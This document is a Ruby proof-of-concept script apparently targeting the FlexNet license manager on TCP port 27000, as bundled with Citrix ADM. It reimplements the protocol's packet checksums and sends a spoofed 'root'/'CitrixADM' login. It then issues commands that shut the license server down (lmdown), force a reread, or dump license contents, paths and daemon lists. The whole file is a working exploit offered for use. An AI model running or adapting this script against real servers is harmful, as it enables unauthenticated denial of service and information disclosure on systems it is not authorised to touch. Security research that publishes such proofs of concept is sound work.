# Encoding: ASCII-8BIT

require 'socket'

def die(msg)
  $stderr.puts msg
  exit 1
end

def usage()
  die("Usage: ruby flexnet-poc.rb <host> <lmdown|lmreread|version|license|path|dlist> [login]")
end

HOST = ARGV[0] || usage()
PORT = 27000

ACTION = ARGV[1] || usage()

LOGIN = ARGV[2] == 'login'

S = TCPSocket.new(HOST, PORT)

# Header-only checksum
def header_checksum(version, packet)
  return (version + packet.bytes[0..0x11].sum()) & 0x0FF
end

# Full packet checksum
def data_checksum(packet_data)
  word_table = ""
  i = 0
  while i < 256
    v4 = 0
    v3 = i
    j = 8

    while j > 0
      if ((v4 ^ v3) & 1) == 1
        v4 = ((v4 >> 1) ^ 0x3A5D) & 0x0FFFF
      else
        v4 = (v4 >> 1) & 0x0FFFF
      end
      v3 >>= 1
      j = j - 1
    end

    word_table << [v4].pack("S")
    i = i + 1
  end
  k = 0
  checksum = 0
  data_bytes = packet_data.unpack("C*")
  word_table_words = word_table.unpack("S*")
  while k < packet_data.length
    position = data_bytes[k] ^ (checksum & 0x0FF)
    checksum = (word_table_words[position] ^ (checksum >> 8)) & 0x0FFFF
    k = k + 1
  end
  return checksum
end

def send_packet(version, message_type, data)
  if data.length + 20 > 0xffff
    puts "Oops, we don't support packets that long, but we could!"
    exit
  end

  header = [
    message_type, # 2 bytes
    0x41414141, # Nonce
    0x42424242, # Ignored
    0x43,       # Ignored
    0x00,       # Upper length byte
    0x4444,     # Ignored
  ].pack('nNNCCn')

  data = [data.length + 20, header, data].pack('na*a*')
  data = [data_checksum(data), data].pack('na*')
  data = [version, header_checksum(version, data), data].pack('CCa*')

  S.write(data)

  # Read everything we can
  out = ''
  loop do
    ready = IO.select([S], nil, nil, 1)

    if ready.nil? || ready.length == 0
      return out
    end

    out += S.recv(1024)
  end

  return out
end

if LOGIN
  puts "Authenticating with username 'root'"

  send_packet(0x2f, 0x0102,
    "\x01\x04" + # If the `\x04` value here is non-zero, we are permitted to log in
    "\x0b\x10" + # Read as a pair of uint16s
    "\x00\x54" + # Read as single uint16
    "\x00\x78" + # Read as single uint16
    "\x00\x00\x16\x97" + # Read as uint32
    "root\x00" +
    "CitrixADM\x00" +
    "/dev/pts/1\x00" +
    "\x00" + # If I add a string here, the response changes
    "x86_f8\x00" +
    "\x01"
  )
end

case ACTION
when 'lmreread'
  out = send_packet(0x2f, 0x0107,
    "root\x00" +
    "CitrixADM\x00" +
    "abcd\x00" + # Unknown ntstring
    "\x01\x00\x00\x7f" # Unknown, but looks like IP address
  )

  puts out.unpack('H*')
  puts out

when 'lmdown'
  out = send_packet(0x2f, 0x010a,
    "\x00" + # Forced?
    "root\x00" + # This is used in a log message
    "CitrixADM\x00" +
    "\x00" +
    "\x01\x00\x00\x7f" +
    "\x00" +
    (LOGIN ? "islocalSys" : "") + # Only attach islocalSys if we're logging in
    "\x00"
  )

  puts out.unpack('H*')
  puts

when 'version'

  out = send_packet(0x2f, 0x0149,
    "\x00\x00\x00\x00" # Our reported version (completely ignored by the server)
  )

  puts 'Server reported: v%d.%d.%d.%d' % out[20..24].unpack('CCCC')

when 'license'

  puts send_packet(0x2f, 0x0108,
    "\x01\x04\x72\x6f\x6f\x74\x00\x43\x69\x74\x72\x69\x78\x41\x44\x4d\x00\x6c\x6d\x67\x72\x64\x00\x2f\x64\x65\x76\x2f\x70\x74\x73\x2f\x31\x00\x00"
  )

when 'path'
  puts send_packet(0x2f, 0x0108,
    "\x01\x04\x72\x6f\x6f\x74\x00\x43\x69\x74\x72\x69\x78\x41\x44\x4d\x00\x6c\x6d\x67\x72\x64\x00\x2f\x64\x65\x76\x2f\x70\x74\x73\x2f\x31\x00\x67\x65\x74\x70\x61\x74\x68\x73\x00"
  )

when 'dlist'
  puts send_packet(0x2f, 0x0108,
    "\x01\x04\x72\x6f\x6f\x74\x00\x43\x69\x74\x72\x69\x78\x41\x44\x4d\x00\x6c\x6d\x67\x72\x64\x00\x2f\x64\x65\x76\x2f\x70\x74\x73\x2f\x31\x00\x64\x6c\x69\x73\x74\x00"
  )
else
  usage()
end

S.close()
